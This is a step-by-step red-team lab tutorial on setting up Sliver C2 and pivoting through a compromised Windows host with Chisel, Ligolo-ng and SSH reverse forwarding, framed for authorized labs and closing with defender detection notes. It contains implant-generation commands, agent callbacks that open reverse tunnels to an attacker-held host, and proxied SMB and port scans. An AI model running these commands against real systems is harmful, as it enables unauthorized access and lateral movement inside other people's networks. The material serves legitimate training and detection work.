final final c2 how2

# Building Your First C2 & Pivoting Lab: A Complete Step-by-Step Guide
## Sliver + Tailscale + Chisel + Ligolo-ng

Red teaming and penetration testing rely on Command and Control (C2) frameworks to manage authorized access to test endpoints. Catching a shell is only the first step. In realistic lab environments, high-value targets may sit behind internal networks, segmented subnets, and restrictive firewalls.

This guide builds a free, open-source C2 and pivoting pipeline from scratch using:

- **Sliver** – Open-source C2 with sessions, implants, native port forwarding, SOCKS5, and Armory
- **Tailscale** – Secure WireGuard mesh for *your own* operator infrastructure
- **Chisel** – Lightweight HTTP-tunneled SOCKS5 proxy
- **Ligolo-ng** – TUN-based tunneling for full subnet access

This is a **lab guide** for authorized environments only: personal labs, training ranges, and formally approved assessments. Do not use these techniques against systems without explicit written permission.

---

## Prerequisites

- Linux attack machine (Kali, Ubuntu, or Debian recommended)
- A dual-homed Windows lab target: one reachable interface plus an isolated internal subnet, such as `10.10.20.0/24`
- Internet access for initial downloads

```bash
sudo apt update
# Cross-compilation toolchain for building Windows implants from Linux
sudo apt install -y mingw-w64 binutils-mingw-w64 g++-mingw-w64
```

### Lab topology

```text
[ Attack Machine / Sliver Team Server ]
          │
          │  Tailscale (100.x.x.x) ← infrastructure only
          ▼
┌──────────────────────────────────────────────┐
│           Compromised Gateway Host           │
│  • Sliver implant callback                   │
│  • Internal IP, e.g. 10.10.20.5              │
└──────────────────────────────────────────────┘
          │
          ├─ Sliver rportfwd / SOCKS5
          ├─ Chisel SOCKS5
          └─ Ligolo-ng TUN
                    │
                    ▼
┌──────────────────────────────────────────────┐
│         Isolated Internal Subnet             │
│              10.10.20.0/24                   │
└──────────────────────────────────────────────┘
```

---

## Part 1: Secure Infrastructure with Tailscale

Tailscale creates a private WireGuard mesh between your own machines.

> **Critical note:** A target that is not enrolled in your tailnet cannot reach `100.x.x.x` addresses. Use an address reachable from the lab target—such as a lab VPN address, a public address, or an authorized redirector—for implant and agent callbacks. Adding a target to Tailscale changes the test environment substantially and is generally unnecessary for this workflow.

```bash
curl -fsSL https://tailscale.com/install.sh | sh
sudo tailscale up
tailscale ip -4
```

Use the resulting `100.x.x.x` address only for connectivity among your own operator and infrastructure systems.

---

## Part 2: Install and Launch Sliver C2

```bash
curl https://sliver.sh/install | sudo bash
sliver
```

> **Version note:** The installer builds Sliver from source and does not pin a release. For reproducible lab results, download a specific prebuilt release from the [Sliver releases page](https://github.com/BishopFox/sliver/releases) and record the version used in your notes.

> **Multiplayer tip:** For team labs, or to reduce the risk of ending an operation by closing a local console, run `sliver-server` separately and connect using `sliver-client`. Enable multiplayer mode and create individual operator configurations.

```sliver
# On the server
multiplayer
new-operator -n <name> -l <server-ip>
```

```bash
# On the operator machine
./sliver-client import <name>_<server-ip>.cfg
./sliver-client
```

### Start an mTLS listener

```sliver
mtls --lhost 0.0.0.0 --lport 8888
jobs
```

### Generate a Windows implant

Replace `ATTACKER_REACHABLE_IP` with an address the target can actually reach.

```sliver
generate --mtls ATTACKER_REACHABLE_IP:8888 --os windows --arch amd64 --save /tmp/implant.exe --skip-symbols
```

### Generate a beacon

```sliver
generate beacon --mtls ATTACKER_REACHABLE_IP:8888 --os windows --arch amd64 --seconds 60 --jitter 30 --save /tmp/beacon.exe --skip-symbols
```

> **Build-comparison note:** `--skip-symbols` creates a smaller implant but leaves more recognizable Go and Sliver-related strings for static analysis. In a controlled lab, compare builds with and without the option:
>
> ```bash
> strings implant.exe | grep -i sliver | tail -10
> ```

**Pivoting tip:** Prefer **sessions** over beacons when deploying Chisel or Ligolo agents and when using interactive Sliver functionality, including `shell`, `socks5`, and `rportfwd`. Beacons execute work asynchronously and can be unsuitable for long-running interactive tasks. If you only have a beacon, run `interactive` first to upgrade it to a session.

### Interact with a session

```sliver
sessions
use <session-id>
```

If you have a beacon and need an interactive session:

```sliver
interactive
```

### Sliver Armory

Sliver Armory provides extensions and aliases for common .NET-based assessment utilities. Review each package and its licensing before installation; extensions may create processes or artifacts on the target.

```sliver
# Search available extensions
armory search seatbelt

# Install one extension
armory install seatbelt

# Install a selected extension after review
armory install <extension-name>
```

Run an installed extension or a .NET assembly in an authorized lab:

```sliver
seatbelt -- -group=system
execute-assembly /path/to/Seatbelt.exe -group=system
```

> **Note:** If Armory operations fail in the client, try the same command from the server component. Use `execute-assembly --help` to review process-hosting and runtime options for your Sliver version.

### Other C2 transports

Sliver supports additional transports including WireGuard, HTTP/HTTPS, and DNS. Select a transport based on the constraints of your authorized environment and validate it in a lab first.

On Windows, Sliver can also support named-pipe pivots for internal chaining:

```sliver
# On an established Windows session
pivots named-pipe --bind academy

# Generate an implant configured for the named-pipe listener
generate --named-pipe 127.0.0.1/pipe/academy -N pipe_academy --skip-symbols
```

### HTTP(S) C2 profile customization

For HTTP(S) listeners, Sliver supports profile configuration in `~/.sliver/config/http-c2.json`. Review the [HTTPS C2 documentation](https://sliver.sh/docs?name=HTTPS+C2) to understand available request, response, filename, and URL-pattern settings before changing a profile.

---

## Part 3: Sliver Native Port Forwarding and SOCKS5

> **Important:** These commands require an active **session**, not a beacon. If you are in a beacon context, run `interactive` first.

### Reverse port forward

```sliver
rportfwd add --bind 127.0.0.1:9000 --remote 127.0.0.1:3389
```

```bash
xfreerdp /v:127.0.0.1:9000 /u:<lab-user> /p:'<lab-password>' /cert:ignore
```

> **Flag note:** Command flags can vary between Sliver versions. Use `rportfwd add -h` to confirm the available syntax in the installed release.

### Built-in SOCKS5

Select a local listener port explicitly and use the same value in Proxychains. This guide uses the conventional SOCKS port, `1080`.

```sliver
socks5 start -P 1080
```

Verify the listener from the attack machine:

```bash
ss -lntp | grep 1080
```

> **Note:** In-band proxying may be less reliable for sustained or high-volume traffic. For broader routing requirements, use a TUN-based approach such as Ligolo-ng in your lab.

---

## Part 4: Chisel SOCKS5 Proxy

### Option A: Standalone Chisel binary

Start the Chisel server on the attack machine:

```bash
./chisel server --reverse -p 8080 -v --socks5
```

Upload and start the client on the authorized Windows lab target (**session required**):

```sliver
upload /path/to/chisel.exe C:/Windows/Tasks/chisel.exe
shell
```

```cmd
C:\Windows\Tasks\chisel.exe client ATTACKER_REACHABLE_IP:8080 R:socks
```

### Option B: Chisel as a Sliver extension

> **Optional workflow:** This is not a built-in Sliver feature. It relies on a third-party extension and should be used only after reviewing its source, licensing, compatibility, and behavior in an isolated lab.

An extension workflow is available through community-maintained projects, including [MrAle98's Chisel fork](https://github.com/MrAle98/chisel).

```bash
# Attack machine: clone and build the extension
git clone https://github.com/MrAle98/chisel
cd chisel/
mkdir -p ~/.sliver-client/extensions/chisel
cp extension.json ~/.sliver-client/extensions/chisel/
make windowsdll_64
make windowsdll_32
cp chisel.x64.dll ~/.sliver-client/extensions/chisel/
cp chisel.x86.dll ~/.sliver-client/extensions/chisel/
```

Restart the Sliver client after installing the extension.

```bash
# Attack machine: start the Chisel server
chisel server --reverse -p 1337 -v --socks5
```

```sliver
# Sliver session: start and manage the client task
chisel client ATTACKER_REACHABLE_IP:1337 R:socks
chisel list
chisel stop <task-id>
```

### Configure Proxychains

Edit `/etc/proxychains4.conf` and add or update the proxy entry:

```text
socks5 127.0.0.1 1080
```

Then use the proxy only against authorized lab targets:

```bash
proxychains4 nmap -sT -Pn -p 445,3389 10.10.20.5
proxychains4 nxc smb 10.10.20.0/24
```

> **Note:** The original Chisel project receives relatively limited updates. Pin and test a known version in your lab, and verify compatibility between client and server builds.

---

## Part 5: Ligolo-ng for Full Subnet Access

**Requirements:** The Ligolo proxy needs root privileges or `CAP_NET_ADMIN` to create TUN interfaces. Run the proxy with `sudo` or as root.

### Modern workflow (v0.8+)

Start the proxy on the attack machine:

```bash
sudo ./proxy --selfcert --laddr 0.0.0.0:11601
```

Upload and start the agent on the authorized lab target (**session required**):

```sliver
upload /path/to/agent.exe C:/Windows/Tasks/agent.exe
shell
```

```cmd
C:\Windows\Tasks\agent.exe -connect ATTACKER_REACHABLE_IP:11601 -ignore-cert -retry
```

In the Ligolo console:

```text
session
autoroute
```

> **⚠ Routing and reachability warning:** A broad route can create a routing loop if it redirects traffic required to maintain the agent connection. This is especially likely when the pivot host is reachable through the same subnet being routed through Ligolo.
>
> Before accepting an `autoroute` recommendation or adding a broad route, verify that the agent callback path remains outside the new tunnel route:
>
> ```bash
> ip route get <agent-reachable-ip>
> ```
>
> If the route would redirect the callback path, add only the specific internal host routes needed for the lab:
>
> ```bash
> sudo ip route add 10.10.20.10/32 dev ligolo
> ```

### Classic workflow (v0.6-style fallback)

Create a TUN interface on Linux:

```bash
sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up
```

Then in the Ligolo console:

```text
session
interface_create --name ligolo
tunnel_start --tun ligolo
route_add --route 10.10.20.0/24
```

> **Compatibility note:** Command names and aliases can vary by Ligolo-ng release. Confirm the commands with `help` in the installed version.

Once the route is established, test only approved lab services:

```bash
nmap -sT -Pn --unprivileged -p 445,80,3389,22 10.10.20.0/24
```

Ligolo-ng also supports listeners that bind a port on the attack machine and forward through the tunnel. Consult the installed version's help output for listener syntax.

---

## Part 6: SSH Reverse Forwarding

Many modern Windows installations include an OpenSSH client. When it is available and the environment permits outbound SSH, it can request a reverse SOCKS proxy without staging another tunneling binary.

First, configure SSH on the attack machine. Edit `/etc/ssh/sshd_config` and set a single listening port, for example:

```text
Port 2222
```

Validate the configuration and restart the SSH service:

```bash
sudo sshd -t
sudo systemctl restart ssh
ss -lntp | grep 2222
```

From the authorized Windows lab host, verify that `ssh.exe` is available, then request reverse dynamic forwarding:

```powershell
ssh -R 1080 <your-username>@ATTACKER_REACHABLE_IP -p 2222
```

If the SSH server permits remote dynamic forwarding, this requests a SOCKS listener on port `1080` on the attack machine. Confirm that the listener was created before configuring Proxychains:

```bash
ss -lntp | grep 1080
```

Configure Proxychains to use `socks5 127.0.0.1 1080`, then validate connectivity to an approved lab host:

```bash
proxychains4 nxc smb 10.10.20.5 -u '<lab-user>' -p '<lab-password>'
```

> **Note:** This method requires an interactive login on the pivot host, a permitted outbound SSH connection, and SSH server support for the requested remote-forward behavior.

---

## Part 7: Teardown and Cleanup

Remove tunnels, routes, and listeners when the lab is complete.

```text
# Ligolo console
tunnel_stop
route_del --route 10.10.20.0/24
ifconfig_del --name ligolo
```

```sliver
# Sliver
socks5 stop
rportfwd list
rportfwd rm <id>
```

```bash
# Chisel
# Stop the client task on the target and stop the local server process.
# For the extension workflow: chisel list, then chisel stop <task-id>.
```

Stale TUN interfaces, routes, and listeners are common causes of confusion during later lab runs.

---

## Part 8: Troubleshooting

| Symptom | Likely cause / fix |
|---|---|
| Implant never calls back | Confirm that the callback address and port are reachable from the target |
| `shell` is unavailable or unsuitable | You are on a beacon; run `interactive` first |
| Forwarding or SOCKS command fails | These commands require a session; run `interactive` if needed |
| Ligolo reports “operation not permitted” | Run the proxy as root or grant `CAP_NET_ADMIN` |
| Ligolo connects but traffic does not flow | Confirm the tunnel is started and required routes are present |
| Ligolo disconnects after routing changes | Verify the callback route stays reachable with `ip route get <agent-reachable-ip>` |
| Proxychains is slow or fails | Use TCP connect scans (`-sT`), disable host discovery (`-Pn`) where appropriate, and begin with individual hosts |
| Agent dies after a network interruption | Use the agent's `-retry` option and review local firewall or egress behavior |
| Implant strings are easy to identify | Compare builds with and without `--skip-symbols` in a controlled lab |

---

## Tool Comparison

| Tool | Type | Layer | Best for | Proxychains? | Speed | Extra binary on target? |
|---|---|---|---|---|---|---|
| Sliver `rportfwd` | Port forward | Application | Single services | No | High | No |
| Sliver SOCKS5 | Built-in SOCKS5 | Application | Quick proxying | Yes | High | No |
| Chisel | HTTP-tunneled SOCKS5 | Application | Simple proxying over HTTP | Yes | Medium | Yes |
| Ligolo-ng | TUN interface | Network | Broad subnet access | No | High | Yes |
| SSH reverse forwarding | SOCKS through SSH | Application | Existing SSH client available | Yes | Medium | No |
| Tailscale | WireGuard mesh | Network | Operator infrastructure | N/A | High | No |

---

## Detection and Safety Notes

### General

- Writing tools to well-known temporary locations is convenient in a lab but commonly visible to endpoint-security products.
- Long-lived outbound connections, including self-signed TLS connections, may be visible in network telemetry and SIEM data.
- Use only the minimum tooling needed for the authorized objective, and record all changes made during the test.
- Keep this workflow confined to environments where you have written authorization.

### Sliver-related telemetry

Defenders can identify Sliver-related activity using process creation, injection telemetry, service-installation logs, file paths, network traffic, and endpoint-memory inspection. Examples observed in public research include:

- `shell` functionality associated with recognizable PowerShell command-line patterns; Sigma-style process-creation detections exist for these patterns.
- Process injection and unusual privilege enablement generating remote-thread and privilege-related telemetry where endpoint monitoring is configured.
- Service creation producing Windows Event ID 7045, sometimes with distinctive service names or temporary-path patterns.
- .NET assembly execution creating child processes and loading managed assemblies in ways visible to process and memory inspection tools.

Use this information to improve detection validation in a lab, not to bypass monitoring.

---

## Further Reading

- [Sliver documentation](https://sliver.sh/docs/)
- [Sliver GitHub repository and releases](https://github.com/BishopFox/sliver)
- [Sliver Armory](https://github.com/sliverarmory)
- [Chisel](https://github.com/jpillora/chisel)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)
- [Tailscale installation](https://tailscale.com/download)
- [OpenSSH `ssh(1)` manual](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [Windows OpenSSH overview](https://learn.microsoft.com/windows-server/administration/openssh/openssh_overview)
- [Microsoft security research on Sliver](https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/)
- [Sigma rule repository](https://github.com/SigmaHQ/sigma)

---

## Conclusion

This lab pipeline covers common authorized pivoting needs:

1. **Tailscale** for private operator infrastructure connectivity
2. **Sliver** for C2, port forwarding, SOCKS5, and extension management
3. **Chisel** for simple HTTP-tunneled proxying
4. **Ligolo-ng** for TUN-based subnet access
5. **SSH reverse forwarding** when an approved environment already provides an SSH client

Practice setup, validation, and teardown in an isolated lab until each component is familiar. Expand only within the scope of your written authorization.

---

**Disclaimer:** This guide is for educational and authorized security testing purposes only. Always obtain proper written permission before testing any system.
